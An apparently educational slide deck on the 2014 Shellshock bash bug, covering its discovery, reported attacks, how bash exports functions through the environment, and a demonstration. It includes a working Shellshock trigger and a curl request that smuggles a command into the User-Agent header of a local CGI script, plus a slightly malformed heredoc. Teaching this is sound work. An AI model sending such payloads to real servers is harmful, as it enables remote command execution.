Shellshock
==========
:description: Shellshock bug
:deckjs_theme: swiss
:deckjs_transition: horizontal-slide

== Shellshock

image::figures/shellshock-logo.png[]

[incremental="true"]
 * Discovered on *Sept, 2014*.
 * a.k.a *Bashdoor*
 * Affects bash
 * Gives the ability to execute any shell command in a remote machine.
 * *National Institute of Standards & Technology* warned vulnerability was *10/10* interms of *serverity*, *impact* & *exploitability*.


== The Shock!

[incremental="true"]
 * On *12th Sept. 2014*, Bash maintainer *Mr. Chet Ramey* is notified of the Bug by *Stephane Chazelas*, an open-source enthusiast.
 * Within hours *Chazelas* submits a patch fixing the bug.
 * Precautions taken before public announcement.
 * On *24th Sept. 2014* public announcement with bash updates
 * On *27th Sept. 2014*, *Michael Zalewski* from *Google* discovers other bash vulnerabilites and help fix them.

== "Bash"ing!

[incremental="true"]
 * *Kaspersky Labs* detected various DDOS attacks.
 * Security firm *Incapsula* noted 17,400 attacks on more than 1,800 web domains.
 * *CloudFare* tracking *1.5 million* attacks per day.
 * DDOS attacks on *Akamai Technologies*
 * Scanning of  *U.S Dept. of Defense*

== Bash environment

 * `env` command

[source,bash]
-----------
$ var=hello
$ env
$ bash
-----------

 * `var` variable is not passed to the new bash instance.

== Exporting the environment

 * `export` command

[source,bash]
---------
$ var=hello
$ export var
$ env
...
...
var=hello
...
$ bash
---------

 * Variable passed to the new bash instance.

== Bash function

[source,bash]
---------
$ foo () { echo "Hello World!"; }
$ foo
Hello World!
$ bash
$ foo
bash: foo: command not found
---------

 * Bash allows passing functions as an environment variable.

== Bash function export

[source,bash]
---------
$ foo () { echo 'Hello World!'; }
$ export -f foo
$ env
...
...
foo=() {  echo 'Hello World!'
}
...
...
$ bash
$ foo
Hello World!
---------


 * Bash *initializes `foo` as function* after parsing the special variable `foo`.

== Bash function export as a variable

[source,bash]
-------------------------------------------
$ foo='() { echo "Hello World!"; }'
$ export foo
$ env
...
...
foo=() { echo "Hello World!"; }
$ bash
$ foo
Hello World!
-------------------------------------------


== The Bug!

[source,bash]
-------------------------------------------
$ bug='() { echo "Hello World!"; }; echo "This is a Bug!"'
$ export bug
$ bash
This is a Bug!
-------------------------------------------

 * A command after the function definition is executed during *bash initialization*!


== An example: CGI-based web server

image::figures/block.png[]

== An example: CGI-based web server

 * CGI script
[source,bash]
-------------------------------------------
cat /usr/lib/cgi-bin/bashbug.sh <EOF

#!/bin/bash
echo “Content-type: text/html”
echo “”
echo “<h1> CGI Bash Bug Example </h1>”
EOF
-------------------------------------------

 * Malicious user request

[source,bash]
-------------------------------------------
$ curl -k -H ‘User-Agent: () { :;}; echo "Your system has been hacked!" > /tmp/hacker’ https://localhost/cgi-bin/bashbug.sh
-------------------------------------------


== References

 . https://en.wikipedia.org/wiki/Shellshock_(software_bug)/
 . https://mustbehero.wordpress.com/2016/03/22/shellshock-bash-bug-explained-with-examples
 . https://blog.cloudflare.com/inside-shellshock
 . http://www.nytimes.com/2014/09/26/technology/security-experts-expect-shellshock-software-bug-to-be-significant.html
